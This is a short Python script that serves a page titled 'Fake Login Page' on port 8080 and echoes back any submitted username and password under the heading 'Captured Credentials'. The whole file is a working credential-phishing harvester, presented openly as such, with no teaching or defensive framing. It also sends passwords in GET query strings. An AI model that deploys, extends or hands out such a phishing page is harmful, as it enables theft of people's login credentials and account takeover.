import http.server
import socketserver
import urllib.parse

PORT = 8080

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(bytes(self.html_page(), "utf8"))
        elif self.path.startswith('/login'):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            query_components = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            username = query_components.get("username", [""])[0]
            password = query_components.get("password", [""])[0]
            self.wfile.write(bytes(f"<h1>Captured Credentials</h1><p>Username: {username}</p><p>Password: {password}</p>", "utf8"))
        else:
            self.send_error(404)

    def html_page(self):
        return """
        <html>
        <head><title>Fake Login Page</title></head>
        <body>
        <h1>Login to Your Account</h1>
        <form action="/login" method="get">
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
        </body>
        </html>
        """

with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
    print(f"Serving at port {PORT}")
    httpd.serve_forever()